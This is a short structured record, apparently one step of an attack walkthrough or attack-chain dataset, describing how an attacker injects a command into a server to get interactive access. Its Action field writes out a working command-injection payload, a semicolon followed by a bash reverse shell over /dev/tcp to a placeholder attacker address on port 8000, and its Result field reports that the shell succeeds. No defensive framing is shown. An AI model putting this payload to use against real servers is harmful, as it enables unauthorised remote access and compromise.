Step4.Description: The attacker decides to establish a reverse shell connection to the server.

StepDetails.Hypothesis: The attacker seeks to gain interactive access to the server for further exploration.
StepDetails.Action: The attacker injects the payload '; bash -c "bash -i >& /dev/tcp/your.server.ip.address/8000 0>&1" #', replacing 'your.server.ip.address' with their own server's IP.
StepDetails.Result: The attacker successfully establishes a reverse shell connection to their server, gaining interactive access to the server's shell.
